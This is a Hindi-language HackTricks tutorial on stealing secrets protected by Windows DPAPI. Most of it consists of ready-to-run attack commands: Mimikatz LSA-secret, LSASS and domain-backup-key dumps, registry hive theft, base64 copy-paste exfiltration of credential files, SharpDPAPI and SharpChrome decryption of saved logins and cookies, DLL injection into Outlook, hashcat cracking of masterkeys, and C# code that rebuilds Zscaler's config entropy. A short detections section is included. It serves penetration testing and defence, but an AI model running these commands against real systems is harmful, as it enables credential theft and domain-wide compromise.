# DPAPI - Passwords निकालना

{{#include ../../banners/hacktricks-training.md}}



## DPAPI क्या है

Data Protection API (DPAPI) का उपयोग मुख्य रूप से Windows operating system में **asymmetric private keys के symmetric encryption** के लिए किया जाता है। इसमें user या system secrets को entropy के एक महत्वपूर्ण स्रोत के रूप में उपयोग किया जाता है। यह तरीका developers के लिए encryption को सरल बनाता है, क्योंकि वे user के logon secrets से derived key का उपयोग करके data को encrypt कर सकते हैं या system encryption के लिए system के domain authentication secrets का उपयोग कर सकते हैं। इससे developers को encryption key की protection स्वयं manage करने की आवश्यकता नहीं रहती।

DPAPI का उपयोग करने का सबसे सामान्य तरीका **`CryptProtectData` और `CryptUnprotectData`** functions के माध्यम से है। ये applications को वर्तमान में logged-on process के security context का उपयोग करके data को encrypt और decrypt करने की अनुमति देते हैं। डिफ़ॉल्ट रूप से, data को केवल उसी user या system context द्वारा decrypt किया जा सकता है जिसने उसे encrypt किया था।<sup>[[2]](#references)[[3]](#references)</sup>

ये functions encryption और decryption के दौरान उपयोग किए जाने वाले एक optional **entropy parameter** को भी स्वीकार करते हैं। Optional entropy से protected data को decrypt करने के लिए वही entropy value आवश्यक होती है।<sup>[[2]](#references)[[6]](#references)</sup>

### Users key generation

DPAPI user के credentials से एक user-specific value, जिसे अक्सर **pre-key** कहा जाता है, derive करता है। Exact derivation account और operating-system version पर निर्भर करता है; domain users के लिए tooling आवश्यक value को user के NTLM material से derive कर सकती है।<sup>[[2]](#references)</sup>

यह विशेष रूप से महत्वपूर्ण है, क्योंकि यदि attacker user का password hash प्राप्त कर लेता है, तो वह:

- उस user की key का उपयोग करके **DPAPI से encrypted किसी भी data को decrypt** कर सकता है, और उसे किसी API से contact करने की आवश्यकता नहीं होती
- valid DPAPI key generate करने का प्रयास करते हुए offline **password crack** करने की कोशिश कर सकता है

DPAPI प्रत्येक protected blob के लिए नया master key बनाने के बजाय प्रत्येक user के लिए एक या अधिक **master keys** maintain करता है। प्रत्येक master key का एक **GUID** (Globally Unique Identifier) होता है, और encrypted blob अपने अंदर record करता है कि उसे कौन-सी master key protect करती है।<sup>[[2]](#references)</sup>

Master keys **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory में stored होती हैं, जहाँ `{SID}` user का Security Identifier है। Master-key file में user की **pre-key** द्वारा protected material और domain users के लिए **domain backup key** द्वारा protected recovery material होता है।<sup>[[2]](#references)</sup>

ध्यान दें कि **master key को encrypt करने के लिए उपयोग की जाने वाली domain key domain controllers में होती है और कभी नहीं बदलती**, इसलिए यदि attacker के पास domain controller का access है, तो वह domain backup key retrieve करके domain के सभी users की master keys decrypt कर सकता है।<sup>[[2]](#references)</sup>

Encrypted blobs अपने headers के अंदर उस **master key के GUID** को contain करते हैं जिसका उपयोग data को encrypt करने के लिए किया गया था।

> [!TIP]
> DPAPI encrypted blobs **`01 00 00 00`** से शुरू होते हैं

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
यह एक user की कई Master Keys जैसी दिखेंगी:

![DPAPI क्या है - Users key generation: यह एक user की कई Master Keys जैसी दिखेंगी](<../../images/image (1121).png>)

### Machine/System key generation

यह वह key है जिसका उपयोग machine data को encrypt करने के लिए करती है। यह **DPAPI_SYSTEM LSA secret** पर आधारित होती है, जो एक special key है और जिसे केवल SYSTEM user access कर सकता है। इस key का उपयोग उस data को encrypt करने के लिए किया जाता है जिसे system को स्वयं access करने की आवश्यकता होती है, जैसे machine-level credentials या system-wide secrets।<sup>[[2]](#references)</sup>

ध्यान दें कि इन keys का **domain backup नहीं होता**, इसलिए इन्हें केवल locally access किया जा सकता है:

- **Mimikatz** command का उपयोग करके LSA secrets dump कर इसे access कर सकता है: `mimikatz lsadump::secrets`
- यह secret registry के अंदर stored होता है, इसलिए administrator **इसे access करने के लिए DACL permissions modify कर सकता है**। Registry path है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hives से offline extraction भी संभव है। उदाहरण के लिए, target पर administrator के रूप में hives को save करके exfiltrate करें:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
फिर अपने analysis box पर hives से DPAPI_SYSTEM LSA secret recover करें और इसका उपयोग machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles आदि) को decrypt करने के लिए करें:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI द्वारा संरक्षित डेटा

DPAPI द्वारा संरक्षित personal data में शामिल हैं:

- Windows creds
- Internet Explorer और Google Chrome के passwords और auto-completion data
- Outlook और Windows Mail जैसे applications के e-mail और internal FTP account passwords
- Shared folders, resources, wireless networks और Windows Vault के passwords, जिनमें encryption keys भी शामिल हैं
- Remote desktop connections, .NET Passport और विभिन्न encryption तथा authentication उद्देश्यों के लिए private keys के passwords
- Credential Manager द्वारा managed network passwords और CryptProtectData का उपयोग करने वाले applications, जैसे Skype, MSN messenger आदि में personal data
- Register के अंदर encrypted blobs
- ...

System protected data में शामिल हैं:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- यदि user के पास domain admin privileges हैं, तो वे **domain backup key** तक पहुंच प्राप्त करके domain में सभी user master keys को decrypt कर सकते हैं:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Local admin privileges के साथ, सभी connected users की DPAPI master keys और SYSTEM key extract करने के लिए **LSASS memory को access करना** संभव है।
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- यदि user के पास local admin privileges हैं, तो वे machine master keys को decrypt करने के लिए **DPAPI_SYSTEM LSA secret** तक access कर सकते हैं:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- यदि user का password या NTLM hash ज्ञात है, तो आप **user की master keys को सीधे decrypt** कर सकते हैं:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- यदि आप user के रूप में किसी session में हैं, तो **RPC का उपयोग करके master keys को decrypt करने के लिए backup key** के लिए DC से पूछना संभव है। यदि आप local admin हैं और user logged in है, तो इसके लिए आप **उसका session token चुरा** सकते हैं:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault की सूची
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Encrypted Data तक पहुँच

### DPAPI Encrypted data खोजें

Common users की **files protected** होती हैं:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- ऊपर दिए गए paths में `\Roaming\` को `\Local\` से बदलकर भी जाँचें।

Enumeration के उदाहरण:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) file system, registry और B64 blobs में DPAPI encrypted blobs खोज सकता है:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
ध्यान दें कि [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (उसी repo से) cookies जैसे sensitive data को DPAPI का उपयोग करके decrypt करने के लिए इस्तेमाल किया जा सकता है।<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- Current user, interactive decryption of saved logins/cookies (Chrome 127+ app-bound cookies के साथ भी काम करता है, क्योंकि user context में चलने पर extra key उपयोगकर्ता के Credential Manager से resolve की जाती है):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline analysis जब आपके पास केवल files हों। पहले profile के "Local State" से AES state key extract करें और फिर इसका उपयोग cookie DB को decrypt करने के लिए करें:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- जब आपके पास DPAPI domain backup key (PVK) और target host पर admin हो, तब पूरे domain में/remote triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- यदि आपके पास किसी user की DPAPI prekey/credkey (LSASS से) है, तो आप password cracking को छोड़कर profile data को सीधे decrypt कर सकते हैं:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
नोट्स
- नए Chrome/Edge builds कुछ cookies को "App-Bound" encryption का उपयोग करके store कर सकते हैं। उन specific cookies का Offline decryption अतिरिक्त app-bound key के बिना संभव नहीं है; इसे automatically retrieve करने के लिए target user context के अंतर्गत SharpChrome चलाएँ। नीचे referenced Chrome security blog post देखें।<sup>[[5]](#references)</sup>

### Access keys और data

- वर्तमान session से DPAPI encrypted files में credentials प्राप्त करने के लिए **SharpDPAPI** का उपयोग करें:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **credentials की जानकारी प्राप्त करें** जैसे encrypted data और guidMasterKey।<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeys तक पहुंच प्राप्त करें**:

RPC का उपयोग करके **domain backup key** का अनुरोध करने वाले user की masterkey को decrypt करें:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** tool masterkey decryption के लिए इन arguments को भी support करता है (ध्यान दें कि domains backup key प्राप्त करने के लिए `/rpc`, plaintext password का उपयोग करने के लिए `/password`, या DPAPI domain private key file निर्दिष्ट करने के लिए `/pvk` का उपयोग करना संभव है...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey का उपयोग करके data Decrypt करें**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** tool `credentials|vaults|rdg|keepass|triage|blob|ps` decryption के लिए इन arguments को भी support करता है (ध्यान दें कि domains backup key प्राप्त करने के लिए `/rpc`, plaintext password का उपयोग करने के लिए `/password`, DPAPI domain private key file निर्दिष्ट करने के लिए `/pvk`, और current users session का उपयोग करने के लिए `/unprotect` का उपयोग करना संभव है...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey का सीधे उपयोग करना (पासवर्ड की आवश्यकता नहीं)

यदि आप LSASS को dump कर सकते हैं, तो Mimikatz अक्सर एक per-logon DPAPI key दिखाता है, जिसका उपयोग plaintext पासवर्ड जाने बिना user की masterkeys को decrypt करने के लिए किया जा सकता है। इस value को सीधे tooling में पास करें:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **वर्तमान user session** का उपयोग करके कुछ data decrypt करें:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py से Offline decryption

यदि आपके पास victim user का SID और password (या NT hash) है, तो आप Impacket के dpapi.py का उपयोग करके DPAPI masterkeys और Credential Manager blobs को पूरी तरह offline decrypt कर सकते हैं।<sup>[[10]](#references)[[11]](#references)</sup>

- Disk पर artefacts की पहचान करें:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- यदि file transfer tooling अविश्वसनीय हो, तो host पर files को base64 में बदलकर output कॉपी करें:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- user के SID और password/hash से masterkey को decrypt करें:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- credential blob को decrypt करने के लिए decrypted masterkey का उपयोग करें:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
यह workflow Windows Credential Manager का उपयोग करने वाले apps द्वारा saved domain credentials को अक्सर recover कर लेता है, जिनमें administrative accounts (जैसे, `*_adm`) भी शामिल हैं।

---

### Optional Entropy ("Third-party entropy") को संभालना

कुछ applications `CryptProtectData` को एक अतिरिक्त **entropy** value देती हैं। इस value के बिना blob को decrypt नहीं किया जा सकता, भले ही सही masterkey ज्ञात हो। इसलिए इस तरह protected credentials को target करते समय entropy प्राप्त करना आवश्यक है (जैसे Microsoft Outlook और कुछ VPN clients)।

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) एक user-mode DLL है, जो target process के अंदर DPAPI functions को hook करती है और transparently supplied optional entropy को record करती है। `outlook.exe` या `vpnclient.exe` जैसी processes के विरुद्ध **DLL-injection** mode में EntropyCapture चलाने पर एक file output होती है, जो प्रत्येक entropy buffer को calling process और blob से map करती है। Captured entropy को बाद में data decrypt करने के लिए **SharpDPAPI** (`/entropy:`) या **Mimikatz** (`/entropy:<file>`) को supply किया जा सकता है।<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline masterkeys की Cracking (Hashcat & DPAPISnoop)

Microsoft ने Windows 10 v1607 (2016) से **context 3** masterkey format पेश किया। `hashcat` v6.2.6 (December 2023) ने hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) और **22102** (context 3) जोड़े, जिससे masterkey file से सीधे user passwords की GPU-accelerated cracking संभव हो गई। इसलिए attackers target system के साथ interact किए बिना word-list या brute-force attacks कर सकते हैं।<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) इस process को automate करता है:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
टूल Credential और Vault blobs को भी parse कर सकता है, उन्हें cracked keys से decrypt कर सकता है और cleartext passwords export कर सकता है।<sup>[[8]](#references)</sup>


### अन्य मशीन का data access करना

**SharpDPAPI और SharpChrome** में remote machine के data को access करने के लिए **`/server:HOST`** option निर्दिष्ट कर सकते हैं। बेशक, आपके पास उस machine को access करने की अनुमति होनी चाहिए और निम्नलिखित example में यह माना गया है कि **domain backup encryption key ज्ञात है**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## अन्य tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक ऐसा tool है जो LDAP directory से सभी users और computers को extract करने तथा RPC के माध्यम से domain controller backup key को extract करने की प्रक्रिया को automate करता है। इसके बाद script सभी computers के IP address resolve करती है और सभी computers पर smbclient चलाकर सभी users के DPAPI blobs retrieve करती है तथा domain backup key से सब कुछ decrypt करती है।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से extracted computers list के साथ आप हर sub network ढूंढ सकते हैं, भले ही आपको उनके बारे में पहले से पता न हो!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI द्वारा protected secrets को automatically dump कर सकता है। 2.x release में ये सुविधाएं जोड़ी गईं:<sup>[[9]](#references)</sup>

* सैकड़ों hosts से blobs का Parallel collection
* **context 3** masterkeys की Parsing और automatic Hashcat cracking integration
* Chrome के "App-Bound" encrypted cookies के लिए Support (अगले section में देखें)
* newly-created blobs को बार-बार poll करने और diff करने के लिए नया **`--snapshot`** mode

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault files के लिए एक C# parser है, जो Hashcat/JtR formats में output दे सकता है और optionally cracking को automatically invoke कर सकता है। यह Windows 11 24H1 तक के machine और user masterkey formats को पूरी तरह support करता है।<sup>[[8]](#references)</sup>


## सामान्य detections

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और अन्य DPAPI-related directories में files तक Access।
- विशेष रूप से **C$** या **ADMIN$** जैसे network share से।
- LSASS memory तक access करने या masterkeys dump करने के लिए **Mimikatz**, **SharpDPAPI** या similar tooling का Use।
- Event **4662**: *An operation was performed on an object* – इसे **`BCKUPKEY`** object तक access के साथ correlate किया जा सकता है।
- जब कोई process *SeTrustedCredManAccessPrivilege* (Credential Manager) request करता है, तब Event **4673/4674**

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023)। Network access वाला attacker किसी domain member को malicious DPAPI backup key retrieve करने के लिए trick कर सकता था, जिससे user masterkeys को decrypt करना संभव हो जाता था। इसे November 2023 cumulative update में patch किया गया – administrators को सुनिश्चित करना चाहिए कि DCs और workstations पूरी तरह patched हों।<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ने legacy DPAPI-only protection को user के **Credential Manager** में stored एक additional key से replace कर दिया। Cookies के offline decryption के लिए अब DPAPI masterkey और **GCM-wrapped app-bound key** दोनों आवश्यक हैं। User context के साथ run किए जाने पर SharpChrome v2.3 और DonPAPI 2.x extra key recover कर सकते हैं।<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID से Derived Custom Entropy

Zscaler Client Connector `C:\ProgramData\Zscaler` के अंतर्गत कई configuration files store करता है (जैसे `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)। प्रत्येक file को **DPAPI (Machine scope)** से encrypted किया जाता है, लेकिन vendor **custom entropy** provide करता है, जो disk पर stored होने के बजाय *runtime पर calculated* होती है।<sup>[[1]](#references)</sup>

Entropy को दो elements से rebuild किया जाता है:

1. `ZSACredentialProvider.dll` के अंदर embedded एक hard-coded secret।
2. उस Windows account का **SID**, जिससे configuration संबंधित है।

DLL द्वारा implemented algorithm इसके equivalent है:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
क्योंकि secret एक ऐसी DLL में embedded है जिसे disk से read किया जा सकता है, **SYSTEM rights वाला कोई भी local attacker किसी भी SID के लिए entropy को फिर से generate कर सकता है** और blobs को offline decrypt कर सकता है:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption से complete JSON configuration प्राप्त होता है, जिसमें हर **device posture check** और उसका expected value शामिल होता है—यह client-side bypasses का प्रयास करते समय अत्यंत valuable information है।

> TIP: अन्य encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI द्वारा **without** entropy (`16` zero bytes) protected हैं। इसलिए SYSTEM privileges प्राप्त होने के बाद इन्हें `ProtectedData.Unprotect` से सीधे decrypt किया जा सकता है।

## References

- [1] [Synacktiv – क्या आपको अपने zero trust पर भरोसा करना चाहिए? Zscaler posture checks को Bypassing](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets। DPAPI में Security analysis और data recovery](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz और C++ के साथ DPAPI Encrypted Secrets को पढ़ना](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows पर Chrome cookies की security में सुधार](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy का Simple Extraction](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 के release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking और DPAPI decryption से DC admin तक](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage और options](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
